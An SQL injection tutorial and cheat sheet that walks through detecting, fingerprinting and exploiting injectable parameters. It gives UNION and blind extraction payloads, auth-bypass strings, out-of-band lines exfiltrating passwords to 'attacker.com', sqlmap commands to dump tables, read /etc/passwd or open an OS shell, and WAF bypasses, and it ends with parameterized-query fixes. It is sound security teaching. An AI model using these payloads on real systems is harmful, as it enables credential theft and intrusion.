# What is SQL Injection?

SQL Injection (SQLi) happens when untrusted user input is concatenated straight into a SQL query, letting an attacker change the query's logic. It is one of the oldest bugs on the OWASP Top 10 and still shows up everywhere because developers build queries with string formatting instead of parameters.

Think of a login query built like this:

```python
# VULNERABLE - never do this
query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
```

If a user types `admin' --` as the username, the query the database actually runs becomes:

```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = ''
```

The `--` turns the rest of the line into a comment, so the password check disappears and the attacker logs in as `admin`. That is the entire idea: your input stops being *data* and becomes part of the *code*.

## Impact - why it matters

- **Read any data** in the database (users, password hashes, credit cards, tokens)
- **Bypass authentication** (log in without a valid password)
- **Modify or delete data** (`UPDATE`, `DELETE`, `DROP TABLE`)
- **Read/write files** on the server (`LOAD_FILE`, `INTO OUTFILE` on MySQL)
- **Remote code execution** via stacked queries, `xp_cmdshell` (MSSQL), or writing a web shell

## Types

- **In-band** - results come back in the same response
  - **Error-based** - you force the DB to throw an error that leaks data
  - **UNION-based** - you append a `UNION SELECT` to pull extra rows into the page
- **Blind** - no direct output; you infer data one bit at a time
  - **Boolean-based** - the page changes (true vs false) depending on your condition
  - **Time-based** - the page delays when your condition is true
- **Out-of-band (OOB)** - data is exfiltrated over a second channel like DNS or HTTP, used when the app is fully blind

## Step 1 - Find the injection point

Add these one at a time to every parameter (URL query, POST body, headers like `Cookie`, `User-Agent`, `Referer`, and JSON fields) and watch the response:

```sql
'                 -- a single quote often breaks the query -> 500 error or different response
"                 -- try double quotes too
`                 -- backtick for MySQL identifiers
')               -- your input may be inside a function call
';                -- semicolon for stacked queries
--               -- comment
#                -- MySQL comment
```

Signs you found something: a database error message, an HTTP 500, a blank page, or any change from the normal response.

## Step 2 - Confirm it with logic

```sql
-- These two should behave DIFFERENTLY if injectable
' AND '1'='1     -- TRUE  -> page looks normal
' AND '1'='2     -- FALSE -> page changes / no results

-- For numeric parameters (no quotes needed)
id=1 AND 1=1     -- TRUE
id=1 AND 1=2     -- FALSE

-- Arithmetic confirmation for numeric fields
id=2-1           -- if this returns the same as id=1, it's numeric injection
```

## Step 3 - Fingerprint the database

Different databases use different functions. Confirm which one you are dealing with:

```sql
-- MySQL / MariaDB
' AND @@version -- -
' UNION SELECT version(),NULL --
' AND CONNECTION_ID()>0 --

-- Microsoft SQL Server (MSSQL)
' AND @@VERSION>0 --
' AND LEN(user)>0 --  (LEN is MSSQL-specific)

-- PostgreSQL
' AND version()::text>'' --

-- Oracle
' AND (SELECT banner FROM v$version WHERE ROWNUM=1) IS NOT NULL --
' AND 1=(SELECT 1 FROM dual) --   (dual is Oracle-specific)

-- SQLite
' AND sqlite_version()>'' --
```

## Step 4 - UNION-based extraction (when data is reflected)

```sql
-- 4a. Find the number of columns (increase until it errors OR the page breaks)
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --   (last number that works = column count)

-- 4b. Find which columns are printed on the page (look for the numbers)
' UNION SELECT 1,2,3 --
' UNION SELECT NULL,NULL,NULL --   (use NULLs if types mismatch)

-- 4c. Pull real data into the visible columns
' UNION SELECT username,password,NULL FROM users --

-- 4d. List all tables (MySQL/Postgres/MSSQL via information_schema)
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables --

-- 4e. List columns of a table you care about
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users' --

-- 4f. Concatenate multiple values into one column
-- MySQL:
' UNION SELECT CONCAT(username,':',password),NULL,NULL FROM users --
-- MSSQL:
' UNION SELECT username+':'+password,NULL,NULL FROM users --
-- Oracle/Postgres:
' UNION SELECT username||':'||password,NULL,NULL FROM users --
```

> **Oracle tip:** every `SELECT` needs a `FROM`. Use `FROM dual`, e.g. `' UNION SELECT NULL,NULL FROM dual --`.

## Step 5 - Blind SQLi (no data in the response)

**Boolean-based** - ask yes/no questions and read the answer from the page:

```sql
-- Is the first letter of the database name 'a'? (page changes if true)
' AND SUBSTRING((SELECT database()),1,1)='a' --

-- How long is the DB name?
' AND LENGTH(database())=4 --

-- Extract the admin password character by character
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='5' --
```

**Time-based** - if there is no visible change, use delays:

```sql
-- MySQL
' AND IF(1=1,SLEEP(5),0) --
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0) --

-- PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END --

-- MSSQL
'; IF (1=1) WAITFOR DELAY '0:0:5' --

-- Oracle
' AND 1=(CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END) --
```

## Step 6 - Out-of-band (OOB) exfiltration

When fully blind and time-based is too slow, force the DB to make a network request to a collaborator you control (e.g. Burp Collaborator, `interactsh`):

```sql
-- MSSQL (DNS lookup)
'; EXEC master..xp_dirtree '\\'+(SELECT TOP 1 password FROM users)+'.attacker.com\a' --

-- MySQL (Windows, UNC path)
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\a')) --

-- Oracle (HTTP request)
' AND (SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE ROWNUM=1)) FROM dual) IS NOT NULL --
```

## Payloads - authentication bypass

```sql
' OR '1'='1' --
' OR 1=1 --
admin' --
admin' #
admin'/*
' OR 1=1 LIMIT 1 --
") OR ("1"="1
```

## Tools

- [sqlmap](https://sqlmap.org/) - the standard automated detection and exploitation tool
- [Ghauri](https://github.com/r0oth3x49/ghauri) - fast alternative to sqlmap, good at bypasses
- [Burp Suite](https://portswigger.net/burp) - Repeater to tune payloads by hand, Intruder to brute-force blind extraction
- [NoSQLMap](https://github.com/codingo/NoSQLMap) - for NoSQL (MongoDB) injection

## Commands - sqlmap cookbook

```bash
# The easiest workflow: save the raw request from Burp (right-click -> Copy to file) then:
sqlmap -r request.txt --batch

# Enumerate databases, then tables, then dump
sqlmap -r request.txt --batch --dbs
sqlmap -r request.txt --batch -D shop --tables
sqlmap -r request.txt --batch -D shop -T users --columns
sqlmap -r request.txt --batch -D shop -T users --dump

# Target a single URL and a specific parameter
sqlmap -u "https://target.tld/item?id=1" -p id --batch --dbs

# POST data
sqlmap -u "https://target.tld/login" --data="user=a&pass=b" --batch

# Authenticated scan (pass your session cookie)
sqlmap -u "https://target.tld/item?id=1" --cookie="session=abc123" --batch

# Turn up detection depth and payload variety
sqlmap -r request.txt --batch --level=5 --risk=3

# Help it past a WAF/filter
sqlmap -r request.txt --batch --tamper=space2comment,between,charencode --random-agent

# Read the current user / DBA status / current DB
sqlmap -r request.txt --batch --current-user --is-dba --current-db

# Read a file from the server (needs FILE privilege)
sqlmap -r request.txt --batch --file-read=/etc/passwd

# Try for an OS shell (needs stacked queries + high privileges)
sqlmap -r request.txt --batch --os-shell
```

## Full manual walkthrough (example)

Target: `https://shop.tld/product?id=1`

1. `?id=1'` -> you get a SQL error. Injectable.
2. `?id=1 ORDER BY 3--` works, `ORDER BY 4--` errors -> **3 columns**.
3. `?id=-1 UNION SELECT 1,2,3--` -> the page prints "2". Column 2 is visible.
4. `?id=-1 UNION SELECT 1,version(),3--` -> prints MySQL version. It's **MySQL**.
5. `?id=-1 UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()--` -> lists tables, you spot `users`.
6. `?id=-1 UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--` -> `username`, `password`.
7. `?id=-1 UNION SELECT 1,CONCAT(username,0x3a,password),3 FROM users--` -> dumps every credential.

> `0x3a` is the hex for `:` - handy when quotes are filtered.

## WAF / filter bypass tricks

```sql
-- Comments to break keywords
UN/**/ION SE/**/LECT
-- Case variation
UnIoN sElEcT
-- Encoding
%27 (URL-encoded quote), CHAR(39), 0x27
-- Whitespace alternatives
UNION%09SELECT   (tab), UNION%0aSELECT (newline)
-- Double URL-encoding
%2527
```

## Mitigation - the fix

**Always use parameterized queries / prepared statements.** The database treats parameters as data, never as code.

```python
# Python (safe)
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))
```

```java
// Java (safe)
PreparedStatement ps = conn.prepareStatement(
    "SELECT * FROM users WHERE username = ? AND password = ?");
ps.setString(1, username);
ps.setString(2, password);
```

```php
// PHP PDO (safe)
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :u");
$stmt->execute(['u' => $username]);
```

Additional defenses:

- Use an ORM correctly (avoid raw query escapes / string building)
- Apply **least privilege** to the DB account (no `FILE`, no `DROP`, no admin)
- Validate and allowlist input types (numeric IDs stay numeric)
- Escape output and use stored procedures where appropriate
- A WAF helps but is **not** a fix on its own

## Practice

- [PortSwigger SQLi labs](https://portswigger.net/web-security/sql-injection) - free, best-in-class
- TryHackMe "SQL Injection" and "SQLMap" rooms
- DVWA, bWAPP, and OWASP Juice Shop (local vulnerable apps)

## Deep dive

- [SQL Injection - Vulnerability Explain](https://securitycipher.com/vulnerability-explain/)
- [PortSwigger SQLi cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

## CWE

- CWE-89: Improper Neutralization of Special Elements used in an SQL Command
